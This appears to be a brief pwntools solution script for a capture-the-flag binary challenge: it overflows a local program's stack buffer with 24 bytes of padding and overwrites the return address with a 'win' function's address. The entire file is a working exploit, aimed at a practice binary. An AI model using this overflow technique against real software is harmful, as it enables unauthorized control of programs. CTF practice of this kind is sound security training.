import pwn

elf = pwn.ELF("./chal")
p = elf.process()

win_addr = elf.symbols['win']


p.sendline(b"a"*24+ pwn.p64(win_addr))
p.interactive()
